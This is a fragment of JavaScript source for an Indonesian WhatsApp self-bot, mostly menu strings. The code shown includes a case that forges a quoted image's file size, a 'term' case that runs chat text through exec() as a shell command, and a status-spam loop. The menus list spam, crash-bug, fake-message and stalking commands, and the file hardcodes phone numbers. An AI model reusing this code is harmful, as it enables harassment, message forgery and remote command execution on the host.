if (args.length < 1) return reply('Masukan angkanya')
filsizei = args[0]
costick3 = await hexa.prepareMessageFromContent(from, {
"imageMessage": {
"url": m.quoted.url,
"mimetype": m.quoted.mimetype,
"caption": m.quoted.caption,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileLength": filsizei,
"height": m.quoted.height,
"width": m.quoted.width,
"mediaKey": m.quoted.mediaKey.low,
"jpegThumbnail": m.quoted.jpegThumbnail
}
}, { quoted: mek })
hexa.relayWAMessage(costick3)
break
//New case\\
case 'tourl2':
media = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
res = await hexa.downloadMediaMessage(media)
anu = await upImages(res)
reply(anu.url)
break


 case 'ngetes':
  
 run = process.uptime()
 nomor = `6288210864298@s.whatsapp.net`
 nomor2 = `50587753432@s.whatsapp.net`
sendButLoc(from, `Tester`, "💡 Have a nice day dude 💡\n       菲諾·朱利安·安加拉\n             Ǐ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜 菲诺", {jpegThumbnail:fs.readFileSync('./lib/image/cecan.jpeg')}, 
[{buttonId:`${prefix}owner2`,buttonText:{displayText: '👤 𝑶𝑾𝑵𝑬𝑹 👤'},type:1},{buttonId:`${prefix}call`,buttonText:{displayText:'⚙️ 𝑺𝑻𝑨𝑻𝑰𝑺𝑻𝑰𝑪 ⚙️'},type:1},{buttonId:`${prefix}stat`,buttonText:{displayText:'🖨️ 𝑺𝑪𝑹𝑰𝑷𝑻 🖨'},type:1},{buttonId:`${prefix}source`}], {contextInfo: { mentionedJid: [nomor,nomor2]}})
break
case 'tester22':
 hexa.updatePresence(from, Presence.recording)
 run = process.uptime()
loc = {
					"degreesLatitude": 0,
					"degreesLongitude": 0,
					"jpegThumbnail": cecan
					}
					hexa.sendMessage(from, 
						{"contentText": `*ཁགཁགཁགཁགཁགགཁགཁགཁགཁགཁགཁགཁགཁགཁགཁགག*\n\n                   🌏  Ǐ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜  🌍\n\n                  菲諾·朱利安·安加拉\n\n${ucapanWaktu}\n
\`\`\`⛃⃝🔖Prefix : [ 𝗠𝘂𝗹𝘁𝗶 - 𝗣𝗿𝗲𝗳𝗶𝘅 ]\`\`\`
\`\`\`⛃⃝⚙️Status : [ ${banChats == 'true' ? 'PUBLIC' : 'SELF'} ]\`\`\`
\`\`\`⛃⃝⏳Activate : [ ${kyun(run)} ]\`\`\`
\`\`\`⛃⃝🔋Baterai : [ ${baterai.baterai}% ${baterai.cas === 'true' ? 'Charge':'No Charge'} ]\`\`\`
\`\`\`⛃⃝🧾Lib : [ 𝗕𝗮𝗶𝗹𝗲𝘆𝘀 ]\`\`\`
\`\`\`⛃⃝🗒️Language : [ 𝗝𝗮𝘃𝗮𝘀𝗿𝗶𝗽𝘁 ]*\`\`\`
\`\`\`⛃⃝📱Device : [ ${device_manufacturer} ]\`\`\`
\`\`\`⛃⃝🙋Owner : [ BNTR COK BLM BUAT MENTIONEDJID ]\`\`\`
                     ⛃⃝🌏DATE
                      
        \`\`\`⛃⃝🌟 ${ucapanWaktu}\`\`\`
      \`\`\`⛃⃝🗞️ ${time} WIB\`\`\`
   \`\`\`⛃⃝🗞️ ${wit} WIT\`\`\`
\`\`\`⛃⃝🗞️ ${wita} WITA\`\`\`

More??....${readmore}
  ⚓⃝  𝑰𝒏𝒔𝒕𝒂𝒈𝒓𝒂𝒎 𝑻𝒐𝒐𝒍𝒔⚓⃝

𝞆⃝ 📡 _${prefix}igfollow_
𝞆⃝ 📡 _${prefix}igunfollow_
𝞆⃝ 📡 _${prefix}iglike_
𝞆⃝ 📡 _${prefix}iglike_
𝞆⃝ 📡 _${prefix}igcomment_
𝞆⃝ 📡 _${prefix}igimage_
𝞆⃝ 📡 _${prefix}upinstastory_
𝞆⃝ 📡 _${prefix}upfeed_
𝞆⃝ 📡 _${prefix}block_
𝞆⃝ 📡 _${prefix}unblock_
𝞆⃝ 📡 _${prefix}igsavepost_
𝞆⃝ 📡 _${prefix}igunsvpost
 
     ⚓⃝  𝑶𝒕𝒉𝒆𝒓⚓⃝ 
     
𝞆⃝ 📡 _${prefix}ping_
𝞆⃝ 📡 _${prefix}speedtest_
𝞆⃝ 📡 _${prefix}owner_
𝞆⃝ 📡 _${prefix}stat_ 
𝞆⃝ 📡 _${prefix}afk_
𝞆⃝ 📡 _${prefix}on_
𝞆⃝ 📡 _${prefix}fitnah_
𝞆⃝ 📡 _${prefix}fitnahpc_
𝞆⃝ 📡 _${prefix}kontak_
𝞆⃝ 📡 _${prefix}igstalk_ <query>
𝞆⃝ 📡 _${prefix}tiktokstalk_ <query>
𝞆⃝ 📡 _${prefix}githubstalk_ <query>
𝞆⃝ 📡 _${prefix}twitterstalk_ <query>
𝞆⃝ 📡 _${prefix}slot_ (Dalam perbaikan)
𝞆⃝ 📡 _${prefix}tictacto_ (Dalam perbaikan)

 
      ⚓⃝  𝑴𝒂𝒌𝒆𝒓⚓⃝ 

𝞆⃝ 📡 _${prefix}sticker_
𝞆⃝ 📡 _${prefix}swm_ <author|packname>
𝞆⃝ 📡 _${prefix}take_ <author|packname>
𝞆⃝ 📡 _${prefix}fdeface_
𝞆⃝ 📡 _${prefix}ttp_
𝞆⃝ 📡 _${prefix}ttp2
𝞆⃝ 📡 _${prefix}ttp3_
𝞆⃝ 📡 _${prefix}ttp4_
𝞆⃝ 📡 _${prefix}smoji_ <emoji>
𝞆⃝ 📡 _${prefix}smoji2_ <emoji>
𝞆⃝ 📡 _${prefix}wasted_ 
𝞆⃝ 📡 _${prefix}triggered_
  
      ⚓⃝  𝑪𝒐𝒏𝒗𝒆𝒓𝒕⚓⃝ 
  
𝞆⃝ 📡 _${prefix}toimg_
𝞆⃝ 📡 _${prefix}tomp3_
𝞆⃝ 📡 _${prefix}tomp4_
𝞆⃝ 📡 _${prefix}slow_
𝞆⃝ 📡 _${prefix}fast_
𝞆⃝ 📡 _${prefix}reverse_
𝞆⃝ 📡 _${prefix}tourl_
𝞆⃝ 📡 _${prefix}tourl2_

        ⚓⃝  𝑮𝒓𝒐𝒖𝒑 ⚓⃝ 

𝞆⃝ 📡 _${prefix}antibule_
𝞆⃝ 📡 _${prefix}antihidetag_
𝞆⃝ 📡 _${prefix}antiviewonce_
𝞆⃝ 📡 _${prefix}group_ (open/close)
𝞆⃝ 📡 _${prefix}add_
𝞆⃝ 📡 _${prefix}kick_
𝞆⃝ 📡 _${prefix}demote_
𝞆⃝ 📡 _${prefix}promote_
𝞆⃝ 📡 _${prefix}add2_
𝞆⃝ 📡 _${prefix}kick2_
𝞆⃝ 📡 _${prefix}demote2_i
𝞆⃝ 📡 _${prefix}promote2_
𝞆⃝ 📡 _${prefix}tagall_
𝞆⃝ 📡 _${prefix}tagall2_
𝞆⃝ 📡 _${prefix}tagall3_
𝞆⃝ 📡 _${prefix}tagall4_
𝞆⃝ 📡 _${prefix}tagall5_
𝞆⃝ 📡 _${prefix}hidetag_
𝞆⃝ 📡 _${prefix}grup_ (open/close)
𝞆⃝ 📡 _${prefix}closegc_
𝞆⃝ 📡 _${prefix}opengc_
𝞆⃝ 📡 _${prefix}hidetag_
𝞆⃝ 📡 _${prefix}kontag_
𝞆⃝ 📡 _${prefix}sticktag_
𝞆⃝ 📡 _${prefix}totag_

     ⚓⃝  𝑫𝒐𝒘𝒏𝒍𝒐𝒂𝒅𝒆𝒓 ⚓⃝ 

𝞆⃝ 📡 _${prefix}ytsearch_ <query>
𝞆⃝ 📡 _${prefix}play_ <query>
𝞆⃝ 📡 _${prefix}jooxsearch_ <query>
𝞆⃝ 📡 _${prefix}video_ <query>
𝞆⃝ 📡 _${prefix}ytmp3_ <link>
𝞆⃝ 📡 _${prefix}igvideo_ <link>
𝞆⃝ 📡 _${prefix}igdl_ <link>
𝞆⃝ 📡 _${prefix}igdl2_ <link>
𝞆⃝ 📡 _${prefix}igstory_ <username>
𝞆⃝ 📡 _${prefix}igimage_ <link>
𝞆⃝ 📡 _${prefix}igaudio_ <link>
𝞆⃝ 📡 _${prefix}ig_ <link>
𝞆⃝ 📡 _${prefix}ytmp4_ <link>
𝞆⃝ 📡 _${prefix}pinterest_
𝞆⃝ 📡 _${prefix}pinterest2_
𝞆⃝ 📡 _${prefix}pinterest3_
𝞆⃝ 📡 _${prefix}pinterestdl_
𝞆⃝ 📡 _${prefix}twitter_ <link>
𝞆⃝ 📡 _${prefix}twtdl_
𝞆⃝ 📡 _${prefix}tiktok_ <link>
𝞆⃝ 📡 _${prefix}tiktokvideo_ <link>
𝞆⃝ 📡 _${prefix}tiktokaudio_ <link>
𝞆⃝ 📡 _${prefix}fb_ <link>
𝞆⃝ 📡 _${prefix}brainly_ <query>
𝞆⃝ 📡 _${prefix}image_ <query>
𝞆⃝ 📡 _${prefix}anime_ <random>

     ⚓⃝   𝑶𝒘𝒏𝒆𝒓 ⚓⃝  
𝞆⃝ 📡 _${prefix}inspect_
𝞆⃝ 📡 _${prefix}join_
𝞆⃝ 📡 _${prefix}get_
𝞆⃝ 📡 _${prefix}term_ <code>
𝞆⃝ 📡 _${prefix}upswteks_
𝞆⃝ 📡 _${prefix}upswimage_
𝞆⃝ 📡 _${prefix}upswvideo_
𝞆⃝ 📡 _${prefix}upswlokasi_
𝞆⃝ 📡 _${prefix}upswaudio_
𝞆⃝ 📡 _${prefix}upswvoice_
𝞆⃝ 📡 _${prefix}upswsticker_
𝞆⃝ 📡 _${prefix}spamsms_
𝞆⃝ 📡 _${prefix}colongsw_
𝞆⃝ 📡 _${prefix}setcmd_
𝞆⃝ 📡 _${prefix}me_
𝞆⃝ 📡 _${prefix}sendbug_
𝞆⃝ 📡 _${prefix}sendbug2_
𝞆⃝ 📡 _${prefix}buggc_
𝞆⃝ 📡 _${prefix}status_
𝞆⃝ 📡 _${prefix}self_
𝞆⃝ 📡 _${prefix}public_
𝞆⃝ 📡 _${prefix}setthumb_
𝞆⃝ 📡 _${prefix}settarget_
𝞆⃝ 📡 _${prefix}setfakeimg_
𝞆⃝ 📡 _${prefix}setreply_
𝞆⃝ 📡 _x_ < java script code >`,
						"footerText": `           𝙭ȿͥt͢aͣrͫs𠒎𠐓𠐔 `,
						"buttons": [
						{"buttonId": `${prefix}array`,
						"buttonText": {"displayText": "👤 𝑶𝑾𝑵𝑬𝑹 👤"
						},"type": 1},
						{"buttonId": `${prefix}stat`,
						"buttonText": {"displayText": "⚙️ 𝑺𝑻𝑨𝑻𝑰𝑺𝑻𝑰𝑪 ⚙️"
						},"type": 1},
						{"buttonId": `${prefix}source`,
						"buttonText": {"displayText": "🖨️ 𝑺𝑪𝑹𝑰𝑷𝑻 🖨"
						},"type": 1},
						], "headerType": 6,
						"locationMessage": loc,
						}, MessageType.buttonsMessage)
					break
case 'term':
       if (!mek.key.fromMe) return fakestatus('SELF-BOT')
			if (!q) return fakegroup(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return fakegroup(`SELF-BOT:~ ${err}`)
			if (stdout) {
			fakegroup(stdout)
			}
			})
		    break
		    case 'newm':
		     nomor = `93993978@s.whatsapp.net`
		     sendButLoc(from, `      ⚓⃝   INSTAGRAM TOOLS ⚓⃝

1. 𝞆⃝🌍 _${prefix}igfollow_
2. 𝞆⃝🌍 _${prefix}igunfollow_
3. 𝞆⃝🌍 _${prefix}iglike_
3. 𝞆⃝🌍 _${prefix}iglike_
4. 𝞆⃝🌍 _${prefix}igcomment_
5. 𝞆⃝🌍 _${prefix}igimage_
6. 𝞆⃝🌍 _${prefix}upinstastory_
7. 𝞆⃝🌍 _${prefix}upfeed_
8. 𝞆⃝🌍 _${prefix}block_
9. 𝞆⃝🌍 _${prefix}unblock_
10. 𝞆⃝🌍 _${prefix}igsavepost_
11. 𝞆⃝🌍 _${prefix}igunsvpost
  

      ⚓⃝   MAKER MENU ⚓⃝
      
12. 𝞆⃝🌍 _${prefix}sticker_
14. 𝞆⃝🌍 _${prefix}swm nama|author_
13. 𝞆⃝🌍 _${prefix}take nama|author_
14. 𝞆⃝🌍 _${prefix}fdeface_
15. 𝞆⃝🌍 _${prefix}smoji < emoji >_
16. 𝞆⃝🌍 _${prefix}smoji2 < emoji >_
17. 𝞆⃝🌍 _${prefix}wasted_
18. 𝞆⃝🌍 _${prefix}triggered_
19. 𝞆⃝🌍 _${prefix}ttp_
20. 𝞆⃝🌍 _${prefix}attp_

      ⚓⃝   MAKER MENU ⚓⃝
      
21. 𝞆⃝🌍 _${prefix}tourl_
22. 𝞆⃝🌍 _${prefix}tourl2
23. 𝞆⃝🌍 _${prefix}tomp3
25. 𝞆⃝🌍 _${prefix}tomp4
25. 𝞆⃝🌍 _${prefix}slow_
26. 𝞆⃝🌍 _${prefix}fast_
27. 𝞆⃝🌍 _${prefix}reverse_
28. 𝞆⃝🌍 _${prefix}toimg_

      ⚓⃝   OTHER ⚓⃝
      
29. 𝞆⃝🌍 _${prefix}speed_
30. 𝞆⃝🌍 _${prefix}afk_
31. 𝞆⃝🌍 _${prefix}on_
32. 𝞆⃝🌍 _${prefix}runtime_
33. 𝞆⃝🌍 _${prefix}owmer_
34. 𝞆⃝🌍 _${prefix}fitnah_
35. 𝞆⃝🌍 _${prefix}fitnahpc_
36. 𝞆⃝🌍 _${prefix}kontak_
36. 𝞆⃝🌍 _${prefix}tictactoe_
37. 𝞆⃝🌍 _${prefix}slot_
38. 𝞆⃝🌍 _${prefix}stat_
39. 𝞆⃝🌍 _${prefix}speedtest_
40. 𝞆⃝🌍 _${prefix}get_ 

      ⚓⃝   DOWNLOADER ⚓⃝

41. 𝞆⃝🌍 _${prefix}ytsearch_ <query>
42. 𝞆⃝🌍 _${prefix}play_ <query>
43. 𝞆⃝🌍 _${prefix}video_ <query>
44. 𝞆⃝🌍 _${prefix}ytmp3_ <link ytb>
44. 𝞆⃝🌍 _${prefix}ytmp4_ <link ytb>
45. 𝞆⃝🌍 _${prefix}brainly_ <query>
46. 𝞆⃝🌍 _${prefix}fbdl_ <link fb>
47. 𝞆⃝🌍 _${prefix}ig_ <link ig>
48. 𝞆⃝🌍 _${prefix}igvideo_ <link ig>
49. 𝞆⃝🌍 _${prefix}igimage_ <link ig>
40. 𝞆⃝🌍 _${prefix}tiktokaudio_ <link tt>
49. 𝞆⃝🌍 _${prefix}tiktokvideo_ <link tt>
50. 𝞆⃝🌍 _${prefix}tiktok_ <link tt>
51. 𝞆⃝🌍 _${prefix}twitter_ <link twt>
52. 𝞆⃝🌍 _${prefix}twtdl_ <link tt>
53. 𝞆⃝🌍 _${prefix}pinterest_ <query>
54. 𝞆⃝🌍 _${prefix}anime_ <query>
55. 𝞆⃝🌍 _${prefix}image_ <query>

      ⚓⃝   GROUP ⚓⃝

56. 𝞆⃝🌍 _${prefix}antibule_
57. 𝞆⃝🌍 _${prefix}antihidetag_
58. 𝞆⃝🌍 _${prefix}antiviewonce_
59. 𝞆⃝🌍 _${prefix}group_ (open/close)
60. 𝞆⃝🌍 _${prefix}add_
61. 𝞆⃝🌍 _${prefix}kick_
62. 𝞆⃝🌍 _${prefix}demote_
63. 𝞆⃝🌍 _${prefix}promote_
64. 𝞆⃝🌍 _${prefix}add2_
65. 𝞆⃝🌍 _${prefix}kick2_
66. 𝞆⃝🌍 _${prefix}demote2_i
67. 𝞆⃝🌍 _${prefix}promote2_
68. 𝞆⃝🌍 _${prefix}tagall_
69. 𝞆⃝🌍 _${prefix}tagall2_
70. 𝞆⃝🌍 _${prefix}tagall3_
71. 𝞆⃝🌍 _${prefix}tagall4_
72. 𝞆⃝🌍 _${prefix}tagall5_
73. 𝞆⃝🌍 _${prefix}hidetag_
74. 𝞆⃝🌍 _${prefix}grup_ (open/close)
75. 𝞆⃝🌍 _${prefix}closegc_
76. 𝞆⃝🌍 _${prefix}opengc_
77. 𝞆⃝🌍 _${prefix}hidetag_
78. 𝞆⃝🌍 _${prefix}kontag_
79. 𝞆⃝🌍 _${prefix}sticktag_
80. 𝞆⃝🌍 _${prefix}totag_
81. 𝞆⃝🌍 _${prefix}rptag_
82. 𝞆⃝🌍 _${prefix}linkgroup_
83. 𝞆⃝🌍 _${prefix}revoke_

      ⚓⃝   OWNER ⚓⃝

84. 𝞆⃝🌍 _${prefix}inspect_
85. 𝞆⃝🌍 _${prefix}join_
86. 𝞆⃝🌍 _${prefix}term_ <code>
87. 𝞆⃝🌍 _${prefix}upswteks_
88. 𝞆⃝🌍 _${prefix}upswimage_
89. 𝞆⃝🌍 _${prefix}upswvideo_
90. 𝞆⃝🌍 _${prefix}upswlokasi_
91. 𝞆⃝🌍 _${prefix}upswaudio_
92. 𝞆⃝🌍 _${prefix}upswvoice_
93. 𝞆⃝🌍 _${prefix}upswsticker_
94. 𝞆⃝🌍 _${prefix}spamsms_
95. 𝞆⃝🌍 _${prefix}colongsw_
96. 𝞆⃝🌍 _${prefix}setcmd_
97. 𝞆⃝🌍 _${prefix}me_
98. 𝞆⃝🌍 _${prefix}sendbug_
99. 𝞆⃝🌍 _${prefix}sendbug2_
100. 𝞆⃝🌍 _${prefix}buggc_
101. 𝞆⃝🌍 _${prefix}status_
102. 𝞆⃝🌍 _${prefix}self_
103. 𝞆⃝🌍 _${prefix}public_
104. 𝞆⃝🌍 _${prefix}setthumb_
105. 𝞆⃝🌍 _${prefix}settarget_
106. 𝞆⃝🌍 _${prefix}setfakeimg_
107. 𝞆⃝🌍 _${prefix}setreply_
108. 𝞆⃝🌍 _>_
109. 𝞆⃝🌍 _$_
110. 𝞆⃝🌍 _${prefix}get
    
      ⚓⃝   NEW ⚓⃝
111. 𝞆⃝🌍 _${prefix}mediafire_
112. 𝞆⃝🌍 _${prefix}size_ <image>
113. 𝞆⃝🌍 _${prefix}sizestik <sticker>`,`Tes`,{jpegThumbnail:cecan}, 
[{buttonId:`${prefix}call`,buttonText:{displayText: '👤 𝑶𝑾𝑵𝑬𝑹 👤'},type:1},
{buttonId:`${prefix}stat`,buttonText:{displayText:'⚙️ 𝑺𝑻𝑨𝑻𝑰𝑺𝑻𝑰𝑪 ⚙️'},type:1},
{buttonId:`${prefix}source`,buttonText:{displayText:'🖨️ 𝑺𝑪𝑹𝑰𝑷𝑻 🖨'},type:1}],
{contextInfo: { mentionedJid: [nomor]}})
break
		    case '999':
case 'menu1':
 case 'menu':
  const timestamp = speed();
  const latensi = speed() - timestamp
 run = process.uptime()
nomor = `6285158405074@s.whatsapp.net`
sendButLoc(from, `*ཁགཁགཁགཁགཁགགཁགཁགཁགཁགཁགཁགཁགཁགཁགཁགག*\n\n                   🌏  Ǐ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜  🌍\n\n                  菲諾·朱利安·安加拉\n\n${ucapanWaktu}\n
    \`\`\`•𝟀⃝🌍 LIB : < BAILEYS >\`\`\`
    \`\`\`•𝟀⃝👤 OWNER : < ${nomor.split("@")[0]} >\`\`\`
    \`\`\`•𝟀⃝🗞️ MODE : < ${banChats === 'True' ? 'PUBLIC':'SELF'}\`\`\`
    \`\`\`•𝟀⃝📡 SPEED : < ${latensi.toFixed(4)} Seccond >\`\`\`
    \`\`\`•𝟀⃝⏳ RUNTIME : < ${kyun(run)} >\`\`\`
    \`\`\`•𝟀⃝🔋 BATTERY : < ${baterai.baterai}% ${baterai.cas === 'true' ? 'Charge':'No Charge'} >\`\`\`
   \`\`\` •𝟀⃝📃 LANGUAGE : < JavaScript >\`\`\`
    \`\`\`•𝟀⃝📱 DEVICE : < ${device_manufacturer} >\`\`\`
                  \`\`\`[ 𝟀⃝⏲️ TIME 𝟀⃝⏲️ ]\`\`\`
           \`\`\`⛃⃝💰️ ${time} WIB\`\`\`
       \`\`\`⛃⃝💰️ ${wit} WIT\`\`\`
    \`\`\`⛃⃝💰${wita} WITA\`\`\`

More??....${readmore}\n      ⚓⃝   INSTAGRAM TOOLS ⚓⃝

1. 𝞆⃝🌍 _${prefix}igfollow_
2. 𝞆⃝🌍 _${prefix}igunfollow_
3. 𝞆⃝🌍 _${prefix}iglike_
3. 𝞆⃝🌍 _${prefix}iglike_
4. 𝞆⃝🌍 _${prefix}igcomment_
5. 𝞆⃝🌍 _${prefix}igimage_
6. 𝞆⃝🌍 _${prefix}upinstastory_
7. 𝞆⃝🌍 _${prefix}upfeed_
8. 𝞆⃝🌍 _${prefix}block_
9. 𝞆⃝🌍 _${prefix}unblock_
10. 𝞆⃝🌍 _${prefix}igsavepost_
11. 𝞆⃝🌍 _${prefix}igunsvpost
  

      ⚓⃝   MAKER MENU ⚓⃝
      
12. 𝞆⃝🌍 _${prefix}sticker_
14. 𝞆⃝🌍 _${prefix}swm nama|author_
13. 𝞆⃝🌍 _${prefix}take nama|author_
14. 𝞆⃝🌍 _${prefix}fdeface_
15. 𝞆⃝🌍 _${prefix}smoji < emoji >_
16. 𝞆⃝🌍 _${prefix}smoji2 < emoji >_
17. 𝞆⃝🌍 _${prefix}wasted_
18. 𝞆⃝🌍 _${prefix}triggered_
19. 𝞆⃝🌍 _${prefix}ttp_
20. 𝞆⃝🌍 _${prefix}attp_

      ⚓⃝   MAKER MENU ⚓⃝
      
21. 𝞆⃝🌍 _${prefix}tourl_
22. 𝞆⃝🌍 _${prefix}tourl2
23. 𝞆⃝🌍 _${prefix}tomp3
25. 𝞆⃝🌍 _${prefix}tomp4
25. 𝞆⃝🌍 _${prefix}slow_
26. 𝞆⃝🌍 _${prefix}fast_
27. 𝞆⃝🌍 _${prefix}reverse_
28. 𝞆⃝🌍 _${prefix}toimg_

      ⚓⃝   OTHER ⚓⃝
      
29. 𝞆⃝🌍 _${prefix}speed_
30. 𝞆⃝🌍 _${prefix}afk_
31. 𝞆⃝🌍 _${prefix}on_
32. 𝞆⃝🌍 _${prefix}runtime_
33. 𝞆⃝🌍 _${prefix}owmer_
34. 𝞆⃝🌍 _${prefix}fitnah_
35. 𝞆⃝🌍 _${prefix}fitnahpc_
36. 𝞆⃝🌍 _${prefix}kontak_
36. 𝞆⃝🌍 _${prefix}tictactoe_
37. 𝞆⃝🌍 _${prefix}slot_
38. 𝞆⃝🌍 _${prefix}stat_
39. 𝞆⃝🌍 _${prefix}speedtest_
40. 𝞆⃝🌍 _${prefix}get_ 

      ⚓⃝   DOWNLOADER ⚓⃝

41. 𝞆⃝🌍 _${prefix}ytsearch_ <query>
42. 𝞆⃝🌍 _${prefix}play_ <query>
43. 𝞆⃝🌍 _${prefix}video_ <query>
44. 𝞆⃝🌍 _${prefix}ytmp3_ <link ytb>
44. 𝞆⃝🌍 _${prefix}ytmp4_ <link ytb>
45. 𝞆⃝🌍 _${prefix}brainly_ <query>
46. 𝞆⃝🌍 _${prefix}fbdl_ <link fb>
47. 𝞆⃝🌍 _${prefix}ig_ <link ig>
48. 𝞆⃝🌍 _${prefix}igvideo_ <link ig>
49. 𝞆⃝🌍 _${prefix}igimage_ <link ig>
40. 𝞆⃝🌍 _${prefix}tiktokaudio_ <link tt>
49. 𝞆⃝🌍 _${prefix}tiktokvideo_ <link tt>
50. 𝞆⃝🌍 _${prefix}tiktok_ <link tt>
51. 𝞆⃝🌍 _${prefix}twitter_ <link twt>
52. 𝞆⃝🌍 _${prefix}twtdl_ <link tt>
53. 𝞆⃝🌍 _${prefix}pinterest_ <query>
54. 𝞆⃝🌍 _${prefix}anime_ <query>
55. 𝞆⃝🌍 _${prefix}image_ <query>

      ⚓⃝   GROUP ⚓⃝

56. 𝞆⃝🌍 _${prefix}antibule_
57. 𝞆⃝🌍 _${prefix}antihidetag_
58. 𝞆⃝🌍 _${prefix}antiviewonce_
59. 𝞆⃝🌍 _${prefix}group_ (open/close)
60. 𝞆⃝🌍 _${prefix}add_
61. 𝞆⃝🌍 _${prefix}kick_
62. 𝞆⃝🌍 _${prefix}demote_
63. 𝞆⃝🌍 _${prefix}promote_
64. 𝞆⃝🌍 _${prefix}add2_
65. 𝞆⃝🌍 _${prefix}kick2_
66. 𝞆⃝🌍 _${prefix}demote2_i
67. 𝞆⃝🌍 _${prefix}promote2_
68. 𝞆⃝🌍 _${prefix}tagall_
69. 𝞆⃝🌍 _${prefix}tagall2_
70. 𝞆⃝🌍 _${prefix}tagall3_
71. 𝞆⃝🌍 _${prefix}tagall4_
72. 𝞆⃝🌍 _${prefix}tagall5_
73. 𝞆⃝🌍 _${prefix}hidetag_
74. 𝞆⃝🌍 _${prefix}grup_ (open/close)
75. 𝞆⃝🌍 _${prefix}closegc_
76. 𝞆⃝🌍 _${prefix}opengc_
77. 𝞆⃝🌍 _${prefix}hidetag_
78. 𝞆⃝🌍 _${prefix}kontag_
79. 𝞆⃝🌍 _${prefix}sticktag_
80. 𝞆⃝🌍 _${prefix}totag_
81. 𝞆⃝🌍 _${prefix}rptag_
82. 𝞆⃝🌍 _${prefix}linkgroup_
83. 𝞆⃝🌍 _${prefix}revoke_

      ⚓⃝   OWNER ⚓⃝

84. 𝞆⃝🌍 _${prefix}inspect_
85. 𝞆⃝🌍 _${prefix}join_
86. 𝞆⃝🌍 _${prefix}term_ <code>
87. 𝞆⃝🌍 _${prefix}upswteks_
88. 𝞆⃝🌍 _${prefix}upswimage_
89. 𝞆⃝🌍 _${prefix}upswvideo_
90. 𝞆⃝🌍 _${prefix}upswlokasi_
91. 𝞆⃝🌍 _${prefix}upswaudio_
92. 𝞆⃝🌍 _${prefix}upswvoice_
93. 𝞆⃝🌍 _${prefix}upswsticker_
94. 𝞆⃝🌍 _${prefix}spamsms_
95. 𝞆⃝🌍 _${prefix}colongsw_
96. 𝞆⃝🌍 _${prefix}setcmd_
97. 𝞆⃝🌍 _${prefix}me_
98. 𝞆⃝🌍 _${prefix}sendbug_
99. 𝞆⃝🌍 _${prefix}sendbug2_
100. 𝞆⃝🌍 _${prefix}buggc_
101. 𝞆⃝🌍 _${prefix}status_
102. 𝞆⃝🌍 _${prefix}self_
103. 𝞆⃝🌍 _${prefix}public_
104. 𝞆⃝🌍 _${prefix}setthumb_
105. 𝞆⃝🌍 _${prefix}settarget_
106. 𝞆⃝🌍 _${prefix}setfakeimg_
107. 𝞆⃝🌍 _${prefix}setreply_
108. 𝞆⃝🌍 _>_
109. 𝞆⃝🌍 _$_
110. 𝞆⃝🌍 _${prefix}get
    
      ⚓⃝   NEW ⚓⃝
111. 𝞆⃝🌍 _${prefix}mediafire_
112. 𝞆⃝🌍 _${prefix}size_ <image>
113. 𝞆⃝🌍 _${prefix}sizestik <sticker`,"💡 Have a nice day dude 💡\n         菲諾·朱利安·安加拉\n               𝙭ȿͥt͢aͣrͫs𠒎𠐓𠐔", {jpegThumbnail:cecan}, 
[{buttonId:`${prefix}call`,buttonText:{displayText: '👤 𝑶𝑾𝑵𝑬𝑹 👤'},type:1},
{buttonId:`${prefix}stat`,buttonText:{displayText:'⚙️ 𝑺𝑻𝑨𝑻𝑰𝑺𝑻𝑰𝑪 ⚙️'},type:1},
{buttonId:`${prefix}source`,buttonText:{displayText:'🖨️ 𝑺𝑪𝑹𝑰𝑷𝑻 🖨'},type:1}],
{contextInfo: { mentionedJid: [nomor]}})
break
					case 'spamsw':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					hexa.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
case 'kontol29':
 case 'menu10':
pino1  = `⚓⃝  𝑰𝒏𝒔𝒕𝒂𝒈𝒓𝒂𝒎 𝑻𝒐𝒐𝒍𝒔⚓⃝

𝞆⃝ 📡 _${prefix}igfollow_
𝞆⃝ 📡 _${prefix}igunfollow_
𝞆⃝ 📡 _${prefix}iglike_
𝞆⃝ 📡 _${prefix}iglike_
𝞆⃝ 📡 _${prefix}igcomment_
𝞆⃝ 📡 _${prefix}igimage_
𝞆⃝ 📡 _${prefix}upinstastory_
𝞆⃝ 📡 _${prefix}upfeed_
𝞆⃝ 📡 _${prefix}block_
𝞆⃝ 📡 _${prefix}unblock_
𝞆⃝ 📡 _${prefix}igsavepost_
𝞆⃝ 📡 _${prefix}igunsvpost
 
     ⚓⃝  𝑶𝒕𝒉𝒆𝒓⚓⃝ 
     
𝞆⃝ 📡 _${prefix}ping_
𝞆⃝ 📡 _${prefix}speedtest_
𝞆⃝ 📡 _${prefix}owner_
𝞆⃝ 📡 _${prefix}stat_ 
𝞆⃝ 📡 _${prefix}afk_
𝞆⃝ 📡 _${prefix}on_
𝞆⃝ 📡 _${prefix}fitnah_
𝞆⃝ 📡 _${prefix}fitnahpc_
𝞆⃝ 📡 _${prefix}kontak_
𝞆⃝ 📡 _${prefix}igstalk_ <query>
𝞆⃝ 📡 _${prefix}tiktokstalk_ <query>
𝞆⃝ 📡 _${prefix}githubstalk_ <query>
𝞆⃝ 📡 _${prefix}twitterstalk_ <query>
𝞆⃝ 📡 _${prefix}slot_ (Dalam perbaikan)
𝞆⃝ 📡 _${prefix}tictacto_ (Dalam perbaikan)

 
      ⚓⃝  𝑴𝒂𝒌𝒆𝒓⚓⃝ 

𝞆⃝ 📡 _${prefix}sticker_
𝞆⃝ 📡 _${prefix}swm_ <author|packname>
𝞆⃝ 📡 _${prefix}take_ <author|packname>
𝞆⃝ 📡 _${prefix}fdeface_
𝞆⃝ 📡 _${prefix}ttp_
𝞆⃝ 📡 _${prefix}ttp2
𝞆⃝ 📡 _${prefix}ttp3_
𝞆⃝ 📡 _${prefix}ttp4_
𝞆⃝ 📡 _${prefix}smoji_ <emoji>
